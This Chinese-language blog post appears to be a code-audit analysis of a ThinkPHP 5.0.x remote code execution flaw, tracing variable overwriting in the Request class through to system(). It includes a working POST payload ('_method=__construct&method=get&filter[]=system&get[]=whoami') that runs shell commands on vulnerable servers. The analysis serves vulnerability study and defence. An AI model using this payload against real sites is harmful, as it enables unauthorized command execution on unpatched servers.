# [代码审计]ThinkPHP 5.0.x 变量覆盖导致的RCE分析




# 前言
漏洞存在版本，分为两大版本：

- ThinkPHP 5.0-5.0.24

- ThinkPHP 5.1.0-5.1.30

# 环境搭建

```
composer create-project topthink/think=5.0.5 thinkphp5.0.5  --prefer-dist
```
修改composer.json

```
"require": {
    "php": ">=5.4.0",
    "topthink/framework": "5.0.5"
},
```
执行`composer update`

# 漏洞分析
payload:

```
_method=__construct&method=get&filter[]=system&get[]=whoami
```

在thinkphp/library/think/Request.php中的method方法里面

```php
public function method($method = false)
    {
        if (true === $method) {
            // 获取原始请求类型
            return IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
        } elseif (!$this->method) {
            if (isset($_POST[Config::get('var_method')])) {
                $this->method = strtoupper($_POST[Config::get('var_method')]);
                $this->{$this->method}($_POST);
            } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {
                $this->method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']);
            } else {
                $this->method = IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
            }
        }
        return $this->method;
    }
```
看这里的判断，跟进一下config的get方法
```php
if (isset($_POST[Config::get('var_method')])) {
                $this->method = strtoupper($_POST[Config::get('var_method')]);
                $this->{$this->method}($_POST);
```
他执行了`Config::get('var_method')`，把参数var_method给传进去
```php
    public static function get($name = null, $range = '')
    {
        $range = $range ?: self::$range;
        // 无参数时获取所有
        if (empty($name) && isset(self::$config[$range])) {
            return self::$config[$range];
        }

        if (!strpos($name, '.')) {
            $name = strtolower($name);
            return isset(self::$config[$range][$name]) ? self::$config[$range][$name] : null;
        } else {
            // 二维数组设置和获取支持
            $name    = explode('.', $name);
            $name[0] = strtolower($name[0]);
            return isset(self::$config[$range][$name[0]][$name[1]]) ? self::$config[$range][$name[0]][$name[1]] : null;
        }
    }
```
返回了一个`$config[$range][$name]`，即`config[_sys_][var_method]`，他的值就是`_method`
![在这里插入图片描述](https://img-blog.csdnimg.cn/8f4059cb60e245e7a99513f53fb5c576.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
所以当我们传入`_method=xxx`的时候，就可以控制这个`$this->{$this->method}($_POST);`，从而去执行想要执行的函数

```php
 if (isset($_POST[Config::get('var_method')])) {
     $this->method = strtoupper($_POST[Config::get('var_method')]);
     $this->{$this->method}($_POST);
```

再看这个类的__construct方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/f139527bbbf74bf9ad8a28b30d0479c9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16)
这个循环会造成一个变量覆盖，而且还是循环的覆盖，可以覆盖很多的值
<hr> 

清楚了漏洞存在的根本原因，接下来我们直接从入口开始分析，public/index.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/242ceb2fd7b54e788aa7e71e3926a29a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_17,color_FFFFFF,t_70,g_se,x_16)
再跟进start.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/ed9336a4670942f0b0ab414e51bfa334.png)
调用了一个App的run方法
再跟进这个方法，这里检测路由会调用routeCheck方法

```php
// 获取应用调度信息
$dispatch = self::$dispatch;
if (empty($dispatch)) {
    // 进行URL路由检测
    $dispatch = self::routeCheck($request, $config);
}
// 记录当前调度信息
$request->dispatch($dispatch);
```
routeCheck里面调用了Route的`check方法`
![在这里插入图片描述](https://img-blog.csdnimg.cn/006943199cc44f00afade0b6a5c5a6a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
再跟进看到这里调用到了request的method方法
![在这里插入图片描述](https://img-blog.csdnimg.cn/36673e2bb2074d0591a060b6fd42a6d7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
之后就是接上前面分析的request类，传参数`_method=__construct`进入request类的`__construct方法`
![在这里插入图片描述](https://img-blog.csdnimg.cn/d0a06b69e7554f53aac1fe9f3161df86.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
开始变量的覆盖

```
filter[]=system
get[]=whoami
method=GET
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/a9440414d90a4bcbb12fdf364041ff05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
再回到`check方法`，返回`return $this->method;`，由于我们传的参数有一个是method=get，所以变量覆盖后，返回的就是get
如果不做这一步（method=get）返回的就是一些乱七八糟，后续中就可能会出错
![在这里插入图片描述](https://img-blog.csdnimg.cn/23151ac0484e455781811082d03ccc65.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)


再走出去回到app类的`run()方法`
判断debug，进入分支内，可以看到有一个`$request->param()`
![在这里插入图片描述](https://img-blog.csdnimg.cn/4c79565f5d0d4e8c82dc911610eba80d.png)
这里vars会被赋值成我们post的数据
![在这里插入图片描述](https://img-blog.csdnimg.cn/14e2a90fe2814767aebd7aa80d5c055a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这里会执行一个array_merge，合并一下url和post中的参数
![在这里插入图片描述](https://img-blog.csdnimg.cn/1876d37f7e0b4b069591b1b0d28506e0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
先进去get方法，因为我们已经通过变量覆盖为get赋值了，所以不会进入判断条件
再进入input方法，第一个参数传的是`$this->get`，这个参数是被我们变量覆盖成whoami的
![在这里插入图片描述](https://img-blog.csdnimg.cn/8082b1ddc5294a618248e97a126f99f4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
进去后直接就返回了whoami
![在这里插入图片描述](https://img-blog.csdnimg.cn/72a5f6654e934856a6f95682bcf7a720.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

出来后param变成了这样，param[0]=whoami
![在这里插入图片描述](https://img-blog.csdnimg.cn/c3022f6130be4b3d96afd6277b31ff63.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
再走到input方法，把param传进去，形参是data
![在这里插入图片描述](https://img-blog.csdnimg.cn/b0e94762fc0b4ad78f348d35d26151ca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
这里再进入filterValue方法，参数继续传下去，data和filter
![在这里插入图片描述](https://img-blog.csdnimg.cn/4876b25c749247e7b8c11ebc0297ce7e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
到这里value就是data，即whoami
filter就是filters遍历出来的，之前遍历覆盖成了system
这样就成功的执行了system("whoami")
![在这里插入图片描述](https://img-blog.csdnimg.cn/87562572859b45debeb39012ca1d9569.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
# 总结
不得不佩服大佬的能力，这个rce分析下来个人感觉还是很复杂的，每一个点都被巧妙的利用起来了，太强了太强了orz

画一张图总结一下这里的利用链吧

![请添加图片描述](https://img-blog.csdnimg.cn/50c1e307d31f4bdd99b61fa3ca08dee2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

